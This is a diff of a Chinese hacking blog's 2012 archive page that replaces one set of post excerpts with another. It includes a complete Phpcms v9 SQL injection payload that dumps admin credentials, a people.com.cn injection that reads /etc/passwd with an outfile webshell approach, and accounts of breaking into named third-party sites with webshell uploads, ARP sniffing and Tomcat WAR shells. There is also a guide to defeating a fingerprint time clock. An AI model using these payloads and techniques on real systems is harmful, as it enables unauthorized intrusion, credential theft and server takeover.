@@ -45,31 +45,34 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-09-07T04:33:36.000Z" itemprop="datePublished">
-          2012-09-07
+      <time datetime="2012-09-17T20:16:45.000Z" itemprop="datePublished">
+          2012-09-18
       </time>
     
     
     | 
-    <a href='/tag/SQL注入/'>SQL注入</a>,
-    
-    <a href='/tag/0day/'>0day</a>,
-    
-    <a href='/tag/Phpcms/'>Phpcms</a>
+    <a href='/tag/12306/'>12306</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/808.seo/">Phpcms v9最新Sql注入0day(转自乌云)</a></h2>
+      <h2 class="post-title"><a href="/834.seo/">10行代码开发完12306订票系统</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>在phpcms/api.php?op=add_favorite中使用了urldecode，导致了一个sqlinject漏洞。$title = urldecode($title);   <br />省略??    <br />$data = array(‘title’=&gt;$title, ‘url’=&gt;$url, ‘adddate’=&gt;SYS_TIME, ‘userid’=&gt;$userid);    <br />省略??    <br />$favorite_db-&gt;insert($data);    <br /></p>  <p>(需要你先注册一个账户并且登陆后访问那个接口文件才会报错,进而<a href="http://ha.cker.in/tag/SQL注入" target="_blank">注入</a>！）    <br />====================================================================    <br />利用POC：    <br />1、注册用户后，访问如下URL获取admin表的前缀：<a href="http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527">http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527</a>    <br />2、修改如下URL中的admin表前缀名(xxoo_admin)，直接爆出管理员的用户名:密码:随机字串    <br /><a href="http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527%2520and%2520%2528select%25201%2520from%2528select%2520count%2528%252a%2529%252Cconcat%2528%2528select%2520%2528select%2520%2528select%2520concat%25280x23%252Ccast%2528concat%2528username%252C0x3a%252Cpassword%252C0x3a%252Cencrypt%2529%2520as%2520char%2529%252C0x23%2529%2520from%2520xxoo_admin%2520LIMIT%25200%252C1%2529%2529%2520from%2520information_schema.tables%2520limit%25200%252C1%2529%252Cfloor%2528rand%25280%2529%252a2%2529%2529x%2520from%2520information_schema.tables%2520group%2520by%2520x%2529a%2529%2520and%2520%25271%2527%253D%25271">http://www.xxoo.com/api.php?op=add_favorite&amp;url=xx.oo&amp;title=%2527%2520and%2520%2528select%25201%2520from%2528select%2520count%2528%252a%2529%252Cconcat%2528%2528select%2520%2528select%2520%2528select%2520concat%25280x23%252Ccast%2528concat%2528username%252C0x3a%252Cpassword%252C0x3a%252Cencrypt%2529%2520as%2520char%2529%252C0x23%2529%2520from%2520xxoo_admin%2520LIMIT%25200%252C1%2529%2529%2520from%2520information_schema.tables%2520limit%25200%252C1%2529%252Cfloor%2528rand%25280%2529%252a2%2529%2529x%2520from%2520information_schema.tables%2520group%2520by%2520x%2529a%2529%2520and%2520%25271%2527%253D%25271</a>    <br />MD5能破解    <br />后台拿shell    <br />进入后台后点击界面–模版风格–随便找个页面点击修改    <br />插入代码后点击提交..    <br />然后回到模版管理找到刚才修改的页面，点击 可视化..    <br /><a href="http://img.cker.in/Phpcmsv9Sql0day_120FB/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/Phpcmsv9Sql0day_120FB/clip_image001_thumb.jpg" width="339" height="318" /></a>    <br />恩，代码执行了</p>
+        &lt;!doctype html&gt;
+&lt;html&gt;
+&lt;head&gt;
+    &lt;title&gt;铁路客户服务中心--客运服务&lt;/title&gt;
+    &lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;script&gt;alert('当前访问用户过多，请稍后重试！');&lt;script&gt
       
       </p>
       
       <p>
-          <a href="/808.seo/" class="excerpt-link">Read More...</a>
+          <a href="/834.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -78,29 +81,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-09-03T09:14:46.000Z" itemprop="datePublished">
-          2012-09-03
+      <time datetime="2012-09-16T05:56:40.000Z" itemprop="datePublished">
+          2012-09-16
       </time>
     
     
     | 
-    <a href='/tag/渗透/'>渗透</a>,
-    
-    <a href='/tag/漏洞/'>漏洞</a>
+    <a href='/tag/渗透/'>渗透</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/804.seo/">某官网的渗透笔记</a></h2>
+      <h2 class="post-title"><a href="/831.seo/">对王心凌的一次渗透过程</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        原文：http://26836659.blogcn.com/articles/%E6%9F%90%E5%AE%98%E7%BD%91%E7%9A%84%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0.html某官网的渗透笔记，挖掘的某0DAY拿到webshell，USER权限，联通外网，提权SYSTEM的EXP无效，看来打的补丁很全，服务器用的是微软FTP,MSSQL，没啥突破口。路过其他盘，发现一个小有年份的B
+        <p>From:www.3est.com&#160; <br />Author:Mars&#160; <br />前几天,听说Cyndi出新专辑了,哥好激动啊..听了几天Music.突然萌发了个思想！想了解更多的有关于她的资料.下面一出好戏即将上演！</p>  <p>总共有三个步骤 ：1.先分析 2.再踩点 3.最后渗透</p>  <p>拿到一个目标要先学会分析,首先Cyndi是位明星,所以利用搜索引擎是不可能搜索到什么有价值的信息.&#160; <br />一般明星在网络上都有自己的Fans基地,好吧.目标已经确定了！    <br />通过百度搜索到一个她留言过的Fans基地<a href="http://www.cyndifans.net/">www.CyndiFans.net</a>    <br />既然目标确定了,该执行第二步了.去ip.3est.com 反查询一下它所在的服务器上还有其他站点没！查询结果如下:&#160; <br /><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image001_thumb.jpg" width="449" height="259" /></a></p>  <p>大概看了下,基本都采用Dz7.0+Uchome+SiteSuper7.5 组合!&#160; <br />手里又没0day.所以没抱有太大希望.只好采用ARP方式来看看能获得什么有价值的信息,首先得先获得C段一台服务器权限,&#160; <br />拿出平时常用的Hscan 来扫描一下有C段没有Ftp弱口令.&#160; <br />悲剧了！竟然一个没扫出来.接着用IIS利用工具扫描下C段.记录装有IIS6.0的服务器IP&#160; <br />因为他的IP是xx.xx.xx.154 大多数情况是1或者129作为网关，叫前C段和后C段,154距离129比较,所以目标放在129-255之间！    <br />然后进入cn.bing.com输入ip:xx.xx.xx.xx 搜索下后C段装有IIS6.0的服务器IP 看看有什么站.一般各类型网站多的的就是虚拟主机,排除掉这些,&#160; <br />就剩下2台主机了..汗 真郁闷..那么集中精力看看其中一台xx人才网,wwwscan扫描下没扫描到有价值东西,进入网站转悠了半天,&#160; <br />在他的分站点了个图片属性,路径是ewe我猜想了下应该是Ewebeditor这个编辑器，输入ewe/admin/admin_login.asp 发现后台被删了,&#160; <br />数据库是默认的先下载下来看看有没有被人搞过,结果失望了.运气不怎么好..先休息下再搞了..去群里聊了会天    <br />过几个小时,来了精神.继续在它的网站转悠,我觉得问题最多的还是上传的地方,就注册了个会员.进入管理中心没有发现什么上传的位置,&#160; <br />接着又注册了个企业会员.发现了个上传企业照片的地方.把小马改成1.asp;.jpg格式结果上传成功了.没提示路径.用抓包工具看一下.&#160; <br />总算见到可爱的小马..拿到webshell之后,开始提权,结果那破服务器慢的要死.开个高速VPN,速度果然提升了.随便看了下感觉提权无望.&#160; <br />.基本组建都被卸载了.目录还不能查看.有SU不过是9.1版本没溢出漏洞.唉 权限配置的很死.看来管理员挺懂安全啊.看了下配置文件最后发现个sa,&#160; <br />哈哈 激动死了!直接加系统用户拿到服务器权限.然后更变态的事情发生了.进去看任务管理器竟然CPU100%总共运行72个进程..&#160; <br />我的天啊…这么破烂的服务器一ARP不就挂掉了.我一个一个把没用的进程结束掉.到30个进程了.在结束服务器就挂了.&#160; <br />然后打开我的电脑管理想看看这服务器是什么高级配置.结果点了属性Shell32.dl被禁,进C盘弹出拒绝访问..打开网页不让下载东西..&#160; <br />一系列的问题皆然发生！终于把Cain放到服务器了.还好不出我所预料.这个服务器网关是129. 哈哈只能扫到后C段的服务器Mac .&#160; <br />然后开始ARP 154这个主机,嗅探开始了.他服务器装有ARP防火墙软件把发送的数据给拦截了..&#160; <br />这时候想起玫瑰的ARP突破方法,结果试验了下没成功,后来配合幻境网盾用了下.成功欺骗突破防火墙.终于嗅探到数据了,&#160; <br />挺高兴的.结果5秒钟都没,Cain卡爆了！服务器挂了10分钟我才登录上.发现嗅探到的3万多个Http信息竟然都是盛大传奇的,&#160; <br />我纳闷了会,地址确实是盛大的!&#160; <br /><a href="http://img.cker.in/8de43b4b81c0_133BA/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/8de43b4b81c0_133BA/clip_image002_thumb.jpg" width="535" height="251" /></a></p>
       
       </p>
       
       <p>
-          <a href="/804.seo/" class="excerpt-link">Read More...</a>
+          <a href="/831.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -109,27 +110,27 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-09-03T09:13:33.000Z" itemprop="datePublished">
-          2012-09-03
+      <time datetime="2012-09-16T05:21:22.000Z" itemprop="datePublished">
+          2012-09-16
       </time>
     
     
     | 
-    <a href='/tag/漏洞/'>漏洞</a>
+    <a href='/tag/bypass/'>bypass</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/801.seo/">Bluecms漏洞大集合</a></h2>
+      <h2 class="post-title"><a href="/828.seo/">如何对付指纹打卡机</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p>既然论坛都整改了，把我所有所有的JB都清空了。大家有0day都舍不得放出来，好吧，从我开始吧，把我挖的0day都放出来了。希望大家有0day的都放出来。别藏着了，藏着Mjj了。   <br />&#160;&#160; Bluecms也就是从一个公司教程看到的cms，然后想了想，既然那里面拿来做教程，我就挖挖这套cms<a href="http://ha.cker.in/tag/漏洞" target="_blank">漏洞</a>，我也没深挖到底，也没能坚持把代码看完。但是已经发现了很多很多的问题。其实能拿到shell就可以了。    <br />&#160;&#160; author： 西毒    <br />来自 :<a href="http://hi.baidu.com/sethc5/blog">http://hi.baidu.com/sethc5/blog</a>    <br /><a href="http://img.cker.in/Bluecms_F32/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/Bluecms_F32/clip_image001_thumb.jpg" width="644" height="594" /></a></p>
+        <p><a href="http://img.cker.in/d9c174033be4_12BDF/clip_image001.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/d9c174033be4_12BDF/clip_image001_thumb.jpg" width="470" height="319" /></a></p>  <p>交通拥堵，上班又迟到；</p>  <p>手指脱皮，考勤又不认；</p>  <p>朋友聚会，想提前下班；</p>  <p>冬天想睡个懒觉……指纹考勤，让这一切均记录在案！上班真是烦！烦！烦！</p>  <p>指纹打卡机就无法代打了吗？答案是否定的，一样可以bypass它！</p>  <p>从今天开始，您不用再为此烦恼。</p>  <p>需要物品</p>  <p><a href="http://img.cker.in/d9c174033be4_12BDF/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/d9c174033be4_12BDF/clip_image002_thumb.jpg" width="468" height="356" /></a></p>  <p><em> 透明胶带（比较宽的那种）   <br /></em> 双面胶    <br /><em> 蜡烛    <br /></em> 剪刀    <br /><em> 易拉罐    <br /></em> 打火机</p>  <p>制作步骤</p>
       
       </p>
       
       <p>
-          <a href="/801.seo/" class="excerpt-link">Read More...</a>
+          <a href="/828.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -138,8 +139,8 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-09-03T09:00:39.000Z" itemprop="datePublished">
-          2012-09-03
+      <time datetime="2012-09-13T06:33:38.000Z" itemprop="datePublished">
+          2012-09-13
       </time>
     
     
@@ -148,17 +149,17 @@
     
     
 </span>
-      <h2 class="post-title"><a href="/799.seo/">授权友情检测51cto</a></h2>
+      <h2 class="post-title"><a href="/825.seo/">友情检测-www.zhaoym.com-详细过程</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        应51cto公司人员邀请   本小组shell2me对51cto.com整站进行一个黑盒安全测试    只进行友情检测，不对51cto旗下任何网站进行破坏性行为    51cto将提供其公司纪念奖品，以及感谢信，作为发现漏洞奖励    启动时间为2011年12月23日 21：30   shell2me参与友情检测人员名单(排名不分先后)：     Jesus     Jacks     神刀     星轨     Mix、小拽     
+        <p>作者：『&quot;Change_Era&quot;』</p>  <p>Q Q： 445452791</p>  <p>今天闲着蛋疼,突然想开个卖源码的站来赚大洋,可惜自己不会玩PHP于是乎,看到个漂亮的站(以下简称:目标站),于是邪恶的我,开始动手,打开<a href="http://www.zhaoym.com/admin">www.zhaoym.com/admin</a> 看了一下是ecshop系统,</p>  <p><a href="http://img.cker.in/www.zhaoym.com_13C36/clip_image002.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/www.zhaoym.com_13C36/clip_image002_thumb.jpg" width="573" height="296" /></a>本人小菜木有此系统0day,于是乎,旁站去看看,发现旁站多多。。。。</p>  <p><a href="http://img.cker.in/www.zhaoym.com_13C36/clip_image004.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image004" border="0" alt="clip_image004" src="http://img.cker.in/www.zhaoym.com_13C36/clip_image004_thumb.jpg" width="574" height="342" /></a></p>  <p>看<a href="http://www.hfinvestment.com">www.hfinvestment.com</a> 这个域名不顺眼,于是直接检测它吧,</p>  <p>发现FCK编辑器, <a href="http://www.hfinvestment.com/fckeditor/_samples/default.html">http://www.hfinvestment.com/fckeditor/_samples/default.html</a></p>  <p>选择插入图像,</p>  <p><a href="http://img.cker.in/www.zhaoym.com_13C36/clip_image006.jpg" target="_blank"><img style="border-bottom: 0px; border-left: 0px; display: inline; border-top: 0px; border-right: 0px" title="clip_image006" border="0" alt="clip_image006" src="http://img.cker.in/www.zhaoym.com_13C36/clip_image006_thumb.jpg" width="573" height="332" /></a></p>
       
       </p>
       
       <p>
-          <a href="/799.seo/" class="excerpt-link">Read More...</a>
+          <a href="/825.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -167,29 +168,58 @@
   <article class="post">
     <header class="post-header">
       <span class="post-meta">
-      <time datetime="2012-09-03T08:59:18.000Z" itemprop="datePublished">
-          2012-09-03
+      <time datetime="2012-09-13T06:16:40.000Z" itemprop="datePublished">
+          2012-09-13
       </time>
     
     
     | 
-    <a href='/tag/注入/'>注入</a>,
-    
-    <a href='/tag/漏洞/'>漏洞</a>
+    <a href='/tag/Tomcat/'>Tomcat</a>
     
     
 </span>
-      <h2 class="post-title"><a href="/797.seo/">从分析代码学习挖掘漏洞人民网实例</a></h2>
+      <h2 class="post-title"><a href="/822.seo/">打造安全的Tomcat服务器</a></h2>
     </header>
     <section class="post-excerpt">
       <p>
       
-        <p><a href="http://bbs.blackbap.org/forum.php?mod=viewthread&amp;tid=2537&amp;fromuid=4372">http://bbs.blackbap.org/forum.php?mod=viewthread&amp;tid=2537</a></p>  <p>作者注：   <br />近日看到论坛上有人发了个“全能大牛”的文章，颇有感慨。其实所谓的“全能”，是来自对基础知识的扎实根基。本文虽谈不上“全能”，也并非什么大做，仅为证明只要根基扎实，你也可以“全能”渗透。    <br />本文特意选用人民网(people.com.cn)中的某一服务器上Web站点作为讲解实例，详细讲述如何根据一个小漏洞逐步分析，扩大范围完成进一步渗透的。    <br />本文仅供研究和学习，不得用于非法用途，否则后果自负。    <br />出于隐私保护的目的，文章所有截图和url经过处理。    <br />本文版权所有，转载请注明出处：Silic Group Hacker Army [BlackBap.Org]    <br />作者：YoCo Smart    <br />来自：Silic Group    <br />站点：<a href="http://blackbap.org/">Http://blackbap.org</a>    <br />相信很多人已经厌倦了这个网络里弥漫的注入，弱口令，万能密码。那么有没有遇到过注入找不到后台，数据库为root或者sa账户却无法写入webshell，得到了后台却拿不到webshell，拿到了webshell却无法提权？？？？？    <br />本文所阐述的例子是：    <br />一台Linux服务器是用了Apache 2.2.10架设了php的网站，数据库为MySQL，网站使用了root账户，但是网站没有后台，也没有phpMyAdmin，服务器中存在一个注入点。因为gpc为on，所以无法写入webshell，但是可以读取服务器上一些已知路径的文件。    <br />那么我们就通过本文来讲一下，如何通过这个注入点，进行下一步渗透的。    <br />我们先来简单描述一下注入点(如果不懂php+MySQL的注入，请参见《<a href="http://bbs.blackbap.org/thread-2433-1-1.html">各色SQL注入文章汇总</a>》)    <br />注入点：</p>  <p><em>.people.com.cn/vote.php?id=3</p>  <p>这个注入点根据存在的文件名就知道，应该是一个投票页面，因为union只有一个字段，所以直接</p>  <p></em>.people.com.cn/vote.php?id=3+union+select+load_file(0x2f6574632f706173737764)+from+mysql.user</p>  <p>就能读到文件了。根据错误回显，得到网站路径为/usr/www。因为gpc设置on，所以</p>  <p>union select 一句话的hex into outfile ‘/usr/www/可写目录/webshell.php’</p>  <p>这样是得不到webshell的，查到MySQL.user中设置的host为%，但是这台服务器对外网实际并未开放3306端口，也无法外联。   <br />那么思路是什么呢？    <br />我们来试着读取网站文件的源码来查找一些其他的漏洞。    <br /></p>
+        <p>作者China-Linux</p>  <p>Tomcat是一个开源的Web服务器,基于tomcat的web运行效率高,因为,颇受web站长的青睐,</p>  <p>不过,在默认的配置下,其存在一定的安全隐患,.可被恶意攻击,.另外,其功能比较单纯,需要我们进一步的进行配置,本次将从安全和功能两方面谈谈基于Tomcat的Web服务器的部署.,</p>  <p>希望对大家有帮助.</p>  <p>OS: Windows Server 2003</p>  <p>IP : 125.42.207.94</p>  <p>Tomcat :apache-tomcat-6.0.18</p>  <p>1.安全测试</p>  <p>（1）登陆后台</p>  <p>（2）在Windows Server 2003 上部署Tomcat，一切保持默认。部署Tomcat的时候要记得安装JDK以及配置JDK环境。JDK的安装配置不在本节赘述。然后登陆Tomcat后台。其缺省的后台是：</p>  <p><a href="http://125.42.207.94:8080/manager/html">http://125.42.207.94:8080/manager/html</a></p>  <p>在浏览器输入该地址，回车后弹出登录框，输入缺省的用户名admin 缺省密码为空，成功登陆后台 如图（1）</p>  <p><a href="http://www.iitlab.com/attachment.php?id=1"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image001" border="0" alt="clip_image001" src="http://img.cker.in/Tomcat_1363A/clip_image001.png" width="520" height="421" /></a></p>  <p>（2）.获得Webshell</p>  <p>（3）在Tomcat的后台有个<b>WAR file to deploy</b><b>模块</b><b>,</b></p>  <p>通过此模块我们可以上传war文件(不是rar),Tomcat可以解析WAR文件,能够将其解压成</p>  <p>Web文件,我们将一个jsp的shell用rar打包,该后缀为(本例为shell.war),将其上传到服务器,可以看到在Tomcat后台多了个shell的目录. 如图2</p>  <p><a href="http://www.iitlab.com/attachment.php?id=2"><img style="border-right-width: 0px; display: inline; border-top-width: 0px; border-bottom-width: 0px; border-left-width: 0px" title="clip_image002" border="0" alt="clip_image002" src="http://img.cker.in/Tomcat_1363A/clip_image002.png" width="129" height="400" /></a></p>  <p>这样一个shell就成功获取了. 如图</p>
       
       </p>
       
       <p>
-          <a href="/797.seo/" class="excerpt-link">Read More...</a>
+          <a href="/822.seo/" class="excerpt-link">Read More...</a>
+      </p>
+      
+    </section>
+  </article>
+  
+  <article class="post">
+    <header class="post-header">
+      <span class="post-meta">
+      <time datetime="2012-09-11T21:47:22.000Z" itemprop="datePublished">
+          2012-09-12
+      </time>
+    
+    
+    | 
+    <a href='/tag/Wordpress/'>Wordpress</a>,
+    
+    <a href='/tag/SQL-Injection/'>SQL Injection</a>
+    
+    
+</span>
+      <h2 class="post-title"><a href="/820.seo/">WordPress BBPress SQL Injection   Path Disclosure</a></h2>
+    </header>
+    <section class="post-excerpt">
+      <p>
+      
+         # Exploit Title: Wordpress plugins - bbpress Multiple Vulnerabilities.   # Date: 31 August 2012    # Author: Dark-Puzzle (Souhail Hammou)    # Vendor Website : www.bbpress.ru / www.bbpress.com    # Risk : Critical    # 
+      
+      </p>
+      
+      <p>
+          <a href="/820.seo/" class="excerpt-link">Read More...</a>
       </p>
       
     </section>
@@ -197,8 +227,8 @@
   
   <nav class="pagination" role="pagination">
     <a class="newer-posts" href="/archives/2012/09/page/2/">← Newer Posts</a>
-    <span class="page-number">Page 3 of 3</span>
-    
+    <span class="page-number">Page 3 of 5</span>
+    <a class="older-posts" href="/archives/2012/09/page/4/">Older Posts →</a>
   </nav>
 </main>
 
